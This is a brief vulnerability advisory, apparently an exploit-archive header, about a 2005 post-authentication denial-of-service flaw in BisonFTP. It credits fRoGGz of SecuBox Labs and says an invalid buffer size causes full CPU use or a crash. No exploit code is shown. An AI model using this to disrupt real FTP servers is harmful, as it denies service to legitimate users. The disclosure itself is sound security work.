BisonFTP is prone to a remote denial-of-service vulnerability. A remote attacker may exploit this issue to deny service for legitimate users.

Reports indicate that the issue may be exploited only after successful authentication.

# Vulnerability: Denial Of Service
# Discovered on: June 26, 2005 by fRoGGz - SecuBox Labs
# When an invalid buffer size is sent to BisonFTPD -> DoS (100% CPU usage or crash)
# NB: Sorry for Python purists, it's the first time that i use it ;)
